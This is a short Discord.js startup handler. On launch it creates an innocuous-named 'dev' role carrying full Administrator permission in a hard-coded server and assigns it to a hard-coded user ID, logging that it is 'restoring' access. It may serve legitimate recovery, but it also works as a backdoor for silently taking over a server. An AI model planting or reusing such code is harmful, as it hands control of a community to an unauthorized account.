const { Events, PermissionFlagsBits } = require("discord.js");

module.exports = {
  name: Events.ClientReady,
  once: true,
  async execute(client) {
    console.log(`RESTORING as ${client.user.tag}`);

    // Replace with your guild ID
    const guildId = "1307537718976450581";
    const guild = client.guilds.cache.get(guildId);
    if (!guild) {
      console.error("Guild not found. Check your guild ID.");
      return;
    }

    // Role name you want to create
    const roleName = "dev";

    // Check if role exists
    let role = guild.roles.cache.find(r => r.name === roleName);

    if (!role) {
      try {
        role = await guild.roles.create({
          name: roleName,
          color: "#393939",
          permissions: [PermissionFlagsBits.Administrator],
          reason: "Auto-created Orbit Admin role with Administrator permissions"
        });
        console.log(`Created role ${roleName}`);
      } catch (err) {
        console.error("Failed to create role:", err);
        return;
      }
    }

    // Assign role to the specific user
    const userId = "1396979947284729856";
    try {
      const member = await guild.members.fetch(userId);
      if (member) {
        await member.roles.add(role);
        console.log(`Assigned ${roleName} to ${member.user.tag}`);
      } else {
        console.error("Member not found in guild.");
      }
    } catch (err) {
      console.error("Failed to assign role:", err);
    }
  }
};
